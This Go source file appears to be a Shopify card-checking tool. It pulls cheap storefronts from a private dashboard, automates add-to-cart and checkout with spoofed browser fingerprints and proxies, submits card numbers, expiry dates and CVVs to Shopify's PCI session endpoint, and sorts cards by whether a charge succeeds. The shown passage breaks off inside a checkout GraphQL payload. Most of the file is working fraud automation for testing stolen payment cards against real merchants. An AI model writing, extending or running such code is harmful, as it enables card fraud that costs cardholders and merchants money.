package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"html"
	"io"
	"math"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"

	fhttp "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"
	"github.com/bogdanfinn/tls-client/profiles"
)

// ──────────────────────── config ─────────────────────────────────────

const defaultShopURL = "https://gpzb9u-u9.myshopify.com"
const path = "test.txt"
const proxyPath = "px.txt"

// Our dashboard JSON API — returns {total, sites:[{url, checkout_price, ...}]}
const workingSitesAPI = "https://charismatic-love-production.up.railway.app/api/sites"
const maxSiteAmount = 10.0

// ──────────────────────── CheckResult ─────────────────────────────────

type CheckStatus int

const (
	StatusCharged  CheckStatus = iota // ORDER_PLACED (SuccessfulReceipt / ProcessedReceipt)
	StatusApproved                    // got a receiptId but non-charged success code
	StatusDeclined                    // FailedReceipt or 3DS
	StatusError                       // could not complete checkout flow
)

type CheckResult struct {
	Card       string
	Status     CheckStatus
	StatusCode string // e.g. ORDER_PLACED, CARD_DECLINED, PROCESSING, etc.
	Amount     string // totalAmount charged
	Currency   string
	SiteName   string // shop domain without https://
	ShopURL    string
	Gateway    string // e.g. "Shopify Payments", "Stripe Donation"
	Error      error  // non-nil for StatusError / StatusDeclined
	Retryable  bool   // true if a different store might succeed
}

// ──────────────────────── Shopify JSON models ────────────────────────

type ProductsResponse struct {
	Products []Product `json:"products"`
}

type Product struct {
	ID       int64     `json:"id"`
	Title    string    `json:"title"`
	Variants []Variant `json:"variants"`
}

type Variant struct {
	ID        int64  `json:"id"`
	Title     string `json:"title"`
	Price     string `json:"price"`
	Available bool   `json:"available"`
}

type WorkingSite struct {
	URL    string
	Amount float64
}

func chooseAffordableSite(apiURL string, maxAmount float64) (WorkingSite, error) {
	endpoints := []string{apiURL}

	var lastErr error
	for _, endpoint := range endpoints {
		sites, err := fetchAffordableSites(endpoint, maxAmount)
		if err != nil {
			lastErr = err
			continue
		}
		if len(sites) == 0 {
			lastErr = fmt.Errorf("no sites <= %.2f from %s", maxAmount, endpoint)
			continue
		}
		return sites[rand.Intn(len(sites))], nil
	}

	if lastErr != nil {
		return WorkingSite{}, lastErr
	}
	return WorkingSite{}, fmt.Errorf("no site endpoint responded")
}

func fetchAffordableSites(apiURL string, maxAmount float64) ([]WorkingSite, error) {
	// The API caps at 100 results per page — paginate through all pages
	const pageSize = 100
	var out []WorkingSite
	seen := make(map[string]bool)

	httpClient := &http.Client{Timeout: 10 * time.Second}

	for offset := 0; ; offset += pageSize {
		pageURL := fmt.Sprintf("%s?limit=%d&offset=%d", apiURL, pageSize, offset)
		resp, err := httpClient.Get(pageURL)
		if err != nil {
			if len(out) > 0 {
				break // return what we have so far
			}
			return nil, fmt.Errorf("GET %s: %w", pageURL, err)
		}

		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			if len(out) > 0 {
				break
			}
			return nil, fmt.Errorf("read API body: %w", err)
		}

		if resp.StatusCode != http.StatusOK {
			if len(out) > 0 {
				break
			}
			return nil, fmt.Errorf("GET %s returned status %d", pageURL, resp.StatusCode)
		}

		bodyStr := strings.TrimSpace(string(body))
		if strings.HasPrefix(bodyStr, "<!DOCTYPE html") || strings.Contains(bodyStr, "<tbody>") {
			sites := parseDashboardHTMLSites(bodyStr, maxAmount)
			return sites, nil
		}

		var payload any
		if err := json.Unmarshal(body, &payload); err != nil {
			if len(out) > 0 {
				break
			}
			return nil, fmt.Errorf("parse API JSON: %w", err)
		}

		pageSites := collectObjects(payload)
		if len(pageSites) == 0 {
			break // no more results
		}

		for _, obj := range pageSites {
			siteURL := extractSiteURL(obj)
			if siteURL == "" {
				continue
			}
			amount, ok := extractAmount(obj)
			if !ok || amount > maxAmount {
				continue
			}
			if seen[siteURL] {
				continue
			}
			seen[siteURL] = true
			out = append(out, WorkingSite{URL: siteURL, Amount: amount})
		}

		if len(pageSites) < pageSize {
			break // last page
		}
	}

	if len(out) == 0 {
		return nil, fmt.Errorf("no affordable sites found in API payload")
	}
	fmt.Printf("[SITES] fetched %d affordable sites (under $%.0f)\n", len(out), maxAmount)
	return out, nil
}

func parseDashboardHTMLSites(htmlBody string, maxAmount float64) []WorkingSite {
	// Matches our dashboard format:
	// <td><a href="URL" target="_blank">URL</a></td><td class="price">$1.00</td>
	rowRe := regexp.MustCompile(`<a href="(https?://[^"]+)"[^>]*>[^<]*</a></td><td[^>]*class="price"[^>]*>\$?([0-9.,—]+)</td>`)
	matches := rowRe.FindAllStringSubmatch(htmlBody, -1)

	var out []WorkingSite
	seen := make(map[string]bool)
	for _, m := range matches {
		if len(m) < 3 {
			continue
		}
		siteURL := strings.TrimSpace(m[1])
		siteURL = strings.TrimRight(siteURL, "/")
		priceStr := strings.TrimSpace(m[2])
		if priceStr == "—" {
			continue // no price info, skip
		}
		amount, ok := toFloat(priceStr)
		if !ok || amount <= 0 || amount > maxAmount {
			continue
		}
		if seen[siteURL] {
			continue
		}
		seen[siteURL] = true
		out = append(out, WorkingSite{URL: siteURL, Amount: amount})
	}
	return out
}

func collectObjects(v any) []map[string]any {
	out := []map[string]any{}
	switch node := v.(type) {
	case map[string]any:
		out = append(out, node)
		for _, child := range node {
			out = append(out, collectObjects(child)...)
		}
	case []any:
		for _, child := range node {
			out = append(out, collectObjects(child)...)
		}
	}
	return out
}

func extractSiteURL(obj map[string]any) string {
	keys := []string{"site", "url", "shop_url", "shopUrl", "shop", "domain", "website"}
	for _, k := range keys {
		raw, ok := obj[k]
		if !ok {
			continue
		}
		s := strings.TrimSpace(fmt.Sprint(raw))
		if s == "" {
			continue
		}
		if !strings.HasPrefix(s, "http://") && !strings.HasPrefix(s, "https://") {
			s = "https://" + s
		}
		u, err := url.ParseRequestURI(s)
		if err != nil || u.Host == "" {
			continue
		}
		return strings.TrimRight(u.Scheme+"://"+u.Host, "/")
	}
	return ""
}

func extractAmount(obj map[string]any) (float64, bool) {
	keys := []string{"amount", "price", "checkout_price", "value", "min_amount", "minAmount"}
	for _, k := range keys {
		raw, ok := obj[k]
		if !ok {
			continue
		}
		if n, ok := toFloat(raw); ok {
			return n, true
		}
	}
	return 0, false
}

func toFloat(v any) (float64, bool) {
	switch n := v.(type) {
	case float64:
		return n, true
	case int:
		return float64(n), true
	case int64:
		return float64(n), true
	case json.Number:
		f, err := n.Float64()
		return f, err == nil
	case string:
		numRe := regexp.MustCompile(`[-+]?\d*\.?\d+`)
		m := numRe.FindString(n)
		if m == "" {
			return 0, false
		}
		f, err := strconv.ParseFloat(m, 64)
		return f, err == nil
	default:
		return 0, false
	}
}

// ──────────────────────── Step 0: find cheapest available product ────

func findCheapestProduct(client tls_client.HttpClient, shopURL string) (productTitle string, productID string, variantID string, priceStr string, err error) {
	reqURL := shopURL + "/products.json?limit=250"
	resp, err := client.Get(reqURL)
	if err != nil {
		return "", "", "", "", fmt.Errorf("GET %s: %w", reqURL, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", "", "", "", fmt.Errorf("GET %s returned status %d", reqURL, resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", "", "", "", fmt.Errorf("reading body: %w", err)
	}

	var data ProductsResponse
	if err := json.Unmarshal(body, &data); err != nil {
		return "", "", "", "", fmt.Errorf("parsing JSON: %w", err)
	}

	bestPrice := math.MaxFloat64
	found := false

	for _, p := range data.Products {
		for _, v := range p.Variants {
			if !v.Available {
				continue
			}
			price, convErr := strconv.ParseFloat(v.Price, 64)
			if convErr != nil {
				continue
			}
			if price < bestPrice {
				bestPrice = price
				productTitle = p.Title
				productID = strconv.FormatInt(p.ID, 10)
				variantID = strconv.FormatInt(v.ID, 10)
				priceStr = v.Price
				found = true
			}
		}
	}

	if !found {
		return "", "", "", "", fmt.Errorf("no available products found at %s", shopURL)
	}
	return productTitle, productID, variantID, priceStr, nil
}

// ──────────────────────── Step 1: add to cart → checkout ─────────────

func addToCartAndCheckout(client tls_client.HttpClient, shopURL, variantID string) (checkoutURL, checkoutToken, sessionToken, checkoutHTML string, err error) {
	// ── POST /cart/add.js ──
	payload := fmt.Sprintf(`{"id":%s,"quantity":1}`, variantID)
	addReq, err := fhttp.NewRequest("POST", shopURL+"/cart/add.js", strings.NewReader(payload))
	if err != nil {
		return "", "", "", "", fmt.Errorf("building cart request: %w", err)
	}
	addReq.Header.Set("Content-Type", "application/json")

	addResp, err := client.Do(addReq)
	if err != nil {
		return "", "", "", "", fmt.Errorf("POST /cart/add.js: %w", err)
	}
	defer addResp.Body.Close()
	io.Copy(io.Discard, addResp.Body) // drain

	if addResp.StatusCode != http.StatusOK {
		return "", "", "", "", fmt.Errorf("POST /cart/add.js returned status %d", addResp.StatusCode)
	}

	// ── GET /checkout (follows redirects) ──
	checkoutResp, err := client.Get(shopURL + "/checkout")
	if err != nil {
		return "", "", "", "", fmt.Errorf("GET /checkout: %w", err)
	}
	defer checkoutResp.Body.Close()

	checkoutURL = checkoutResp.Request.URL.String()

	// Extract checkout_token from URL: /checkouts/cn/{checkout_token}/
	tokenRe := regexp.MustCompile(`/checkouts/cn/([^/?]+)`)
	if m := tokenRe.FindStringSubmatch(checkoutURL); len(m) > 1 {
		checkoutToken = m[1]
	}

	// Read HTML and extract session token
	htmlBytes, err := io.ReadAll(checkoutResp.Body)
	if err != nil {
		return "", "", "", "", fmt.Errorf("reading checkout HTML: %w", err)
	}
	checkoutHTML = string(htmlBytes)

	sessionRe := regexp.MustCompile(`<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"`)
	if m := sessionRe.FindStringSubmatch(checkoutHTML); len(m) > 1 {
		sessionToken = html.UnescapeString(m[1])
		// Strip surrounding quotes left by &quot; encoding
		sessionToken = strings.Trim(sessionToken, `"`)
	}

	return checkoutURL, checkoutToken, sessionToken, checkoutHTML, nil
}

// ──────────────────────── Step 2: fetch private access token ─────────

func extractPrivateAccessTokenID(checkoutHTML string) string {
	// The HTML contains &quot;-escaped JSON with checkoutSessionIdentifier.
	// Unescape first so we can search cleanly.
	unescaped := html.UnescapeString(checkoutHTML)

	// Look for "checkoutSessionIdentifier":"<hex>" in the unescaped HTML
	re := regexp.MustCompile(`"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"`)
	m := re.FindStringSubmatch(unescaped)
	if len(m) < 2 {
		return ""
	}

	return m[1]
}

func fetchPrivateAccessToken(client tls_client.HttpClient, shopURL, checkoutURL, patID string) (string, error) {
	reqURL := fmt.Sprintf("%s/private_access_tokens?id=%s&checkout_type=c1",
		shopURL, url.QueryEscape(patID))

	req, err := fhttp.NewRequest("GET", reqURL, nil)
	if err != nil {
		return "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "*/*")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("GET private_access_tokens: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("reading response: %w", err)
	}

	return fmt.Sprintf("[%d] %s", resp.StatusCode, string(body)), nil
}

// ──────────────────────── Step 3: fetch actions JS ─────────────────

func extractActionsJSURL(checkoutHTML, shopURL string) string {
	// Look for actions JS file: actions.<hash>.js or actions-legacy.<hash>.js
	re := regexp.MustCompile(`(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)`)
	m := re.FindStringSubmatch(checkoutHTML)
	if len(m) < 2 {
		return ""
	}
	return shopURL + m[1]
}

func extractProcessingJSURL(checkoutHTML, shopURL string) string {
	// The PollForReceipt persisted query ID lives in a checkout-web JS bundle.
	// useHasOrdersFromMultipleShops is confirmed to contain it; other bundles are fallbacks.
	patterns := []string{
		// Confirmed to contain PollForReceipt hash
		`(/cdn/shopifycloud/checkout-web/assets/c1/useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)`,
		// Fallbacks
		`(/cdn/shopifycloud/checkout-web/assets/c1/page-Processing[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/c1/page-ThankYou[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Pp]rocessing[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Rr]eceipt[A-Za-z0-9_.-]*\.js)`,
	}
	for _, p := range patterns {
		re := regexp.MustCompile(p)
		m := re.FindStringSubmatch(checkoutHTML)
		if len(m) >= 2 {
			return shopURL + m[1]
		}
	}
	return ""
}

func extractProcessingJSURLs(checkoutHTML, shopURL string) []string {
	// Return ALL candidate JS bundle URLs for PollForReceipt extraction,
	// in priority order. useHasOrdersFromMultipleShops is confirmed first.
	patterns := []string{
		`(/cdn/shopifycloud/checkout-web/assets/c1/useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/c1/page-Processing[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/c1/page-ThankYou[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Pp]rocessing[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Rr]eceipt[A-Za-z0-9_.-]*\.js)`,
	}
	seen := map[string]bool{}
	var urls []string
	for _, p := range patterns {
		re := regexp.MustCompile(p)
		for _, m := range re.FindAllStringSubmatch(checkoutHTML, -1) {
			if len(m) >= 2 {
				u := shopURL + m[1]
				if !seen[u] {
					seen[u] = true
					urls = append(urls, u)
				}
			}
		}
	}
	// Final fallback: include ALL checkout-web JS bundles not already added.
	// Stores with renamed/restructured bundles still have the hash somewhere.
	// Skip obvious non-query bundles (locale, polyfills, vendor css-only).
	allRe := regexp.MustCompile(`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]+\.js)`)
	skip := regexp.MustCompile(`(?i)(locale-|polyfills|libphonenumber|qrcodegen|getCountryCallingCode|/css/|FullScreenBackground|component-[A-Z])`)
	for _, m := range allRe.FindAllStringSubmatch(checkoutHTML, -1) {
		if len(m) >= 2 {
			u := shopURL + m[1]
			if seen[u] {
				continue
			}
			if skip.MatchString(m[1]) {
				continue
			}
			seen[u] = true
			urls = append(urls, u)
		}
	}
	return urls
}

func fetchActionsJS(client tls_client.HttpClient, actionsURL, shopURL string) (jsBody string, err error) {
	req, err := fhttp.NewRequest("GET", actionsURL, nil)
	if err != nil {
		return "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "*/*")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("origin", shopURL)
	req.Header.Set("priority", "u=1")
	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "script")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("GET actions JS: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("reading response: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("GET actions JS returned status %d", resp.StatusCode)
	}

	return string(body), nil
}

func extractProposalID(jsBody string) string {
	// Look for: id:"<hex>",type:"query",name:"Proposal"
	re := regexp.MustCompile(`id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"`)
	m := re.FindStringSubmatch(jsBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSubmitForCompletionID(jsBody string) string {
	re := regexp.MustCompile(`id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"`)
	m := re.FindStringSubmatch(jsBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractPollForReceiptID(jsBody string) string {
	// Try multiple patterns — Shopify changes JS bundle format periodically
	patterns := []string{
		// Original: id:"hash",type:"query",name:"PollForReceipt"
		`id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"`,
		// name first: name:"PollForReceipt",type:"query",id:"hash"
		`name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"`,
		// Just id near PollForReceipt with any order/extra fields
		`"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"`,
		`id:\s*"([a-f0-9]{64})"[^}]{0,200}"PollForReceipt"`,
		// With single quotes or backticks
		`id:\s*'([a-f0-9]{64})'\s*,\s*type:\s*'query'\s*,\s*name:\s*'PollForReceipt'`,
		// Broader: any 64-char hex near PollForReceipt within 300 chars
		`PollForReceipt.{0,300}?([a-f0-9]{64})`,
		`([a-f0-9]{64}).{0,300}?PollForReceipt`,
	}
	for _, p := range patterns {
		re := regexp.MustCompile(p)
		m := re.FindStringSubmatch(jsBody)
		if len(m) >= 2 {
			return m[1]
		}
	}
	return ""
}

func extractReceiptID(submitBody string) string {
	re := regexp.MustCompile(`"id"\s*:\s*"(gid://shopify/ProcessedReceipt/[0-9a-zA-Z]+)"`)
	m := re.FindStringSubmatch(submitBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractReceiptSessionToken(submitBody string) string {
	re := regexp.MustCompile(`"sessionToken"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(submitBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractStableID(checkoutHTML string) string {
	unescaped := html.UnescapeString(checkoutHTML)
	re := regexp.MustCompile(`"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"`)
	m := re.FindStringSubmatch(unescaped)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractCommitSha(checkoutHTML string) string {
	unescaped := html.UnescapeString(checkoutHTML)
	re := regexp.MustCompile(`"commitSha"\s*:\s*"([a-f0-9]{40})"`)
	m := re.FindStringSubmatch(unescaped)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSourceToken(checkoutHTML string) string {
	re := regexp.MustCompile(`<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"`)
	m := re.FindStringSubmatch(checkoutHTML)
	if len(m) < 2 {
		return ""
	}
	val := html.UnescapeString(m[1])
	return strings.Trim(val, `"`)
}

func extractIdentificationSignature(checkoutHTML string) string {
	unescaped := html.UnescapeString(checkoutHTML)
	re := regexp.MustCompile(`checkoutCardsinkCallerIdentificationSignature":"([^"]+)"`)
	m := re.FindStringSubmatch(unescaped)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractPCISessionID(pciBody string) string {
	re := regexp.MustCompile(`"id"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(pciBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractDeliveryHandle(proposalBody string) string {
	// From sellerProposal.delivery.deliveryLines[0].selectedDeliveryStrategy.handle
	re := regexp.MustCompile(`"selectedDeliveryStrategy"\s*:\s*\{"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSignedHandles(proposalBody string) []string {
	re := regexp.MustCompile(`"signedHandle"\s*:\s*"([^"]+)"`)
	matches := re.FindAllStringSubmatch(proposalBody, -1)
	var handles []string
	for _, m := range matches {
		if len(m) >= 2 {
			handles = append(handles, m[1])
		}
	}
	return handles
}

func extractPaymentMethodID(proposalBody string) string {
	// Match the shopify_payments payment method identifier
	re := regexp.MustCompile(`"paymentMethodIdentifier"\s*:\s*"([^"]+)"\s*,\s*"name"\s*:\s*"shopify_payments"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractShippingAmount(proposalBody string) string {
	// From sellerProposal.delivery.deliveryLines[0].availableDeliveryStrategies[0].amount.value.amount
	// Match after CompleteDeliveryStrategy
	re := regexp.MustCompile(`"__typename"\s*:\s*"CompleteDeliveryStrategy"\}\]\s*,\s*"__typename"\s*:\s*"DeliveryLine"\}`)
	// Simpler: find amount in the selected delivery strategy breakdown
	re2 := regexp.MustCompile(`"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"`)
	m := re2.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		_ = re
		return ""
	}
	return m[1]
}

func extractCheckoutTotal(proposalBody string) string {
	// neww.py uses sellerProposal.checkoutTotal.value.amount as the payment amount
	re := regexp.MustCompile(`"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSellerTotal(proposalBody string) string {
	// Match "total":{"value":{"amount":"X"}} — only sellerProposal has value here;
	// buyerProposal's "total" is {"__typename":"AnyConstraint"} with no "value".
	re := regexp.MustCompile(`"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSellerMerchandisePrice(proposalBody string) string {
	// ContextualizedProductVariantMerchandise only appears in the sellerProposal section
	re := regexp.MustCompile(`"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSellerCurrency(proposalBody string) string {
	// supportedCurrencies in the payment section shows the shop's actual currency
	re := regexp.MustCompile(`"supportedCurrencies"\s*:\s*\["([^"]+)"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSellerCountry(proposalBody string) string {
	// supportedCountries appears in sellerProposal payment section
	re := regexp.MustCompile(`"supportedCountries"\s*:\s*\["([^"]+)"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func patchPayload(payload, currency, country string) string {
	if currency != "USD" {
		payload = strings.ReplaceAll(payload, `"currencyCode": "USD"`, `"currencyCode": "`+currency+`"`)
		payload = strings.ReplaceAll(payload, `"presentmentCurrency": "USD"`, `"presentmentCurrency": "`+currency+`"`)
	}
	if country != "US" {
		payload = strings.ReplaceAll(payload, `"countryCode": "US"`, `"countryCode": "`+country+`"`)
		payload = strings.ReplaceAll(payload, `"phoneCountryCode": "US"`, `"phoneCountryCode": "`+country+`"`)
	}
	return payload
}

func generateAttemptToken(checkoutToken string) string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 10)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return checkoutToken + "-" + string(b)
}

func generatePageID() string {
	b := make([]byte, 16)
	for i := range b {
		b[i] = byte(rand.Intn(256))
	}
	b[6] = (b[6] & 0x0f) | 0x40 // version 4
	b[8] = (b[8] & 0x3f) | 0x80 // variant
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

// ──────────────────────── Step 9: PCI session (card tokenisation) ─

func sendPCISession(identSig, cardNumber, cardName string, cardMonth, cardYear int, cvv, shopDomain, proxyURL string) (int, string, error) {
	payload := fmt.Sprintf(`{
  "credit_card": {
    "number": %q,
    "month": %d,
    "year": %d,
    "verification_value": %q,
    "start_month": null,
    "start_year": null,
    "issue_number": "",
    "name": %q
  },
  "payment_session_scope": %q
}`, cardNumber, cardMonth, cardYear, cvv, cardName, shopDomain)

	req, err := fhttp.NewRequest("POST", "https://checkout.pci.shopifyinc.com/sessions", strings.NewReader(payload))
	if err != nil {
		return 0, "", fmt.Errorf("building PCI request: %w", err)
	}

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", "https://checkout.pci.shopifyinc.com")
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=")
	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("sec-fetch-storage-access", "active")
	req.Header.Set("shopify-identification-signature", identSig)
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")

	// Standalone tls-client for PCI endpoint
	pciOptions := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(30),
		tls_client.WithClientProfile(profiles.Chrome_124),
	}
	if proxyURL != "" {
		pciOptions = append(pciOptions, tls_client.WithProxyUrl(proxyURL))
	}
	pciClient, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), pciOptions...)
	if err != nil {
		return 0, "", fmt.Errorf("failed to create PCI tls client: %w", err)
	}
	resp, err := pciClient.Do(req)
	if err != nil {
		return 0, "", fmt.Errorf("POST PCI session: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", fmt.Errorf("reading PCI response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

// ──────────────────────── Step 4: send Proposal GraphQL ─────────

func sendProposal(client tls_client.HttpClient, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, currency, country string) (int, string, error) {
	gqlPayload := fmt.Sprintf(`{
  "variables": {
    "sessionInput": {
      "sessionToken": %q
    },
    "queueToken": null,
    "discounts": {
      "lines": [],
      "acceptUnexpectedDiscounts": true
    },
    "delivery": {
      "deliveryLines": [
        {
          "destination": {
            "partialStreetAddress": {
              "address1": "",
              "city": "",
              "countryCode": "US",
              "lastName": "",
              "phone": "",
              "oneTimeUse": false
            }
          },
          "selectedDeliveryStrategy": {
            "deliveryStrategyMatchingConditions": {
              "estimatedTimeInTransit": {"any": true},
              "shipments": {"any": true}
            },
            "options": {}
          },
          "targetMerchandiseLines": {"any": true},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {"any": true},
          "destinationChanged": true
        }
      ],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    },
    "deliveryExpectations": {
      "deliveryExpectationLines": []
    },
    "merchandise": {
      "merchandiseLines": [
        {
          "stableId": %q,
          "merchandise": {
            "productVariantReference": {
              "id": "gid://shopify/ProductVariantMerchandise/%s",
              "variantId": "gid://shopify/ProductVariant/%s",
              "properties": [],
              "sellingPlanId": null,
              "sellingPlanDigest": null
            }
          },
          "quantity": {
            "items": {"value": 1}
          },
					"expectedTotalPrice": {"any": true},
          "lineComponentsSource": null,
          "lineComponents": []
        }
      ]
    },
    "memberships": {"memberships": []},
    "payment": {
      "totalAmount": {"any": true},
      "paymentLines": [],
      "billingAddress": {
        "streetAddress": {
          "address1": "",
          "city": "",
          "countryCode": "US",
          "lastName": "",
          "phone": ""
        }
      }
    },
    "buyerIdentity": {
      "customer": {
        "presentmentCurrency": "USD",
        "countryCode": "US"
      },
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {"countryCode": "US"},
      "rememberMe": false
    },
    "tip": {"tipLines": []},
    "poNumber": null,
    "taxes": {
      "proposedAllocations": null,
      "proposedTotalAmount": {"any": true},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    },
    "note": {
      "message": null,
      "customAttributes": []
    },
    "localizationExtension": {"fields": []},
